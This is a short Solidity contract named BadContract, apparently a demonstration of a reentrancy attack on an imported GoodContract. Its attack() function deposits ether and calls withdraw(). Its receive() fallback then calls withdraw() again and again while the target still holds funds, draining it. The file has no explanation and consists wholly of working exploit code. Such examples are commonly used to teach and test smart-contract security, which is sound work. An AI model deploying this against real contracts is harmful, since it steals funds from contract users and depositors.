// SPDX-License-Identifier: MIT

pragma solidity >= 0.5.0 < 0.9.0;

import "./GoodContract.sol";

contract BadContract 
{
    GoodContract public goodcontract;
    constructor(address _goodcontract)
    {
        goodcontract=GoodContract(_goodcontract);
    }
     

     receive()external payable
     {
      if(address(goodcontract).balance>0)
             goodcontract.withdraw();
     }

    function attack()public payable
    {
        goodcontract.addBalance{value:msg.value}();
        goodcontract.withdraw();
    }
}